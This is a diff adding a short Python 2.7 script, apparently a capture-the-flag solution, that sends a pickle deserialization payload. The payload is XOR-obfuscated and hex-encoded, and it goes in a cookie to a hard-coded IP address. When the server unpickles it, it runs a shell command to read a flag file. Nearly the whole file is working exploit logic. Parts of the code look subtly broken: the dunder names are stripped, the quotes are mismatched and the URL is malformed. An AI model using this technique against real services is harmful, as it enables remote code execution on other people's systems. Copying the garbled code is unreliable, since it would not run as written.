@@ -1,0 +1,23 @@
+import requests as r
+import cPickle
+
+def x(s1,s2):
+    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))
+
+class rce(object):
+    def reduce(self):
+        return (eval,("int(eval("import('os').popen('cat flag').read()"))",))
+
+d = cPickle.dumps(rce())
+key = "x"*len(d)
+payload = x(d,key)
+print(payload.encode("hex"))
+
+cookie = {
+    "Cookie":"auth_cookie="+payload.encode("hex")+"; key="+key
+}
+print(cookie)
+resp = r.get("http://34.159.53.91:31251/dashboard%22,headers=cookie)
+print(resp.text)
+
+# run with python 2.7
